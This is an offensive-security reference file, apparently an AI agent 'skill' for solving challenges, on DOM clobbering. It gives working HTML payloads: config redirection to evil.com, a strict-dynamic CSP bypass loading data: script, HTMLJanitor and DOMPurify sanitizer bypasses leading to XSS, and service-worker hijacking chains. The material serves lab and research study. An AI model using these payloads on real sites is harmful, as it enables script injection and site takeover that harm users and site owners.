---
name: dom-clobbering
description: "DOM clobbering techniques. Load when a solver finds code reading properties from document/window using named element access, global variable fallback patterns (x || defaultValue), or when HTML injection exists but CSP blocks scripts."
---

# DOM Clobbering Skill

## When to use
- HTML injection exists but CSP blocks inline scripts
- Code reads `document.X` or `window.X` where X is never explicitly defined as a JS variable
- Code uses `window.config || {default: true}` pattern — the `||` fallback with a global is the classic clobbering target
- HTML filter allows `id` and `name` attributes

## Clobbering patterns

### Single property
`<img id="config">` → `document.config` returns the `<img>` element

### Nested property (2 levels) — the Chromium HTMLCollection trick
Two elements with same `id` create an HTMLCollection in Chromium/WebKit:
```html
<a id="config"></a>
<a id="config" name="apiUrl" href="https://evil.com"></a>
```
`window.config` → HTMLCollection. `window.config.apiUrl` → second `<a>` element.
`window.config.apiUrl + ''` → `"https://evil.com"` (anchor's `toString()` returns href).

### Form + input (nested access)
```html
<form id="config"><input name="apiUrl" value="https://evil.com"></form>
```
`document.config.apiUrl.value` → `"https://evil.com"`

### `<a>` toString trick
Only `<a>` and `<area>` elements return their `href` from `toString()`. All other elements return `"[object HTMLElement]"`. This is critical for clobbering properties that get coerced to strings.

## PortSwigger research and labs

### CSP bypass via DOM clobbering (PortSwigger 2023)
When `strict-dynamic` CSP is in use, a nonce-protected script can generate other scripts. If the script reads a config variable from the DOM (e.g., `codeBasePath`), clobber it:
```html
<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>
```
The nonce-protected script loads attacker's code via `data:` URL. CSP allows it because parent script has the nonce.

### Service worker hijacking via DOM clobbering (PortSwigger 2022)
Code reads CDN domain via `document.getElementById()` for service worker registration. `getElementById()` quirk: if an injected element appears before the legitimate one, it wins. Clobber the CDN domain → control `importScripts()` in the service worker → permanent site takeover.

### PortSwigger Top 10 2025: "Under the Beamer"
DOM clobbering + Chromium HTMLCollection + library-driven node-removal gadget → null out an escaping function at runtime → pivot into innerHTML iframe-attribute injection sink → bypass escaping entirely.

### HTMLJanitor library bypass (PortSwigger lab)
HTMLJanitor uses `element.attributes` property to filter. Clobber `attributes` with an `<input name="attributes">` inside a `<form>`. The filter iterates the clobbered property (an input element) instead of the real NamedNodeMap — `length` is undefined, loop doesn't execute, all attributes pass through unfiltered.
```html
<form id=x tabindex=0 onfocus=print()>
  <input name=attributes>
</form>
```

### DOMPurify + cid: protocol (PortSwigger lab)
DOMPurify allows `cid:` protocol, which doesn't URL-encode double quotes. Inject:
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
Code: `window.defaultAvatar || {avatar: '/default.svg'}` → clobbered → avatar property contains `cid:"onerror=alert(1)//` → assigned to `src` → XSS.

## What to target
- **Security checks**: `if (document.csrfToken)` — clobber to truthy but wrong value
- **Configuration objects**: `document.config.baseUrl` — redirect API calls
- **Feature flags**: `document.featureFlags` — bypass feature gates
- **Library config globals**: `window.LIBRARY_CONFIG` checked before init
- **Script URLs**: `config.cdnPath + '/script.js'` — clobber cdnPath
- **Service worker domains**: `getElementById()` for SW registration URL

## Limitations
- Cannot clobber existing JS variables (only undefined `document`/`window` properties)
- Cannot create properties with dots in name directly
- Only `<a>` and `<area>` return href from `toString()` — all others return `[object HTML*Element]`
- `Object.freeze(Object.prototype)` prevents prototype-based clobbering
- Some frameworks use `Map` or `WeakMap` — immune

## Chains
- DOM clobbering + CSP `strict-dynamic` → load attacker script via nonce-protected parent
- DOM clobbering + service worker → permanent site takeover
- DOM clobbering + prototype pollution → clobber merge target
- DOM clobbering + sanitizer bypass → clobber `attributes` property of filter

## Key references
- PortSwigger DOM clobbering: https://portswigger.net/web-security/dom-based/dom-clobbering
- PortSwigger CSP bypass via clobbering: https://portswigger.net/research/bypassing-csp-via-dom-clobbering
- PortSwigger service worker hijacking: https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering
- DOM Invader clobbering detection: enable in Burp browser settings
- PortSwigger Top 10 2025: "Under the Beamer" — HTMLCollection clobbering + node-removal gadget
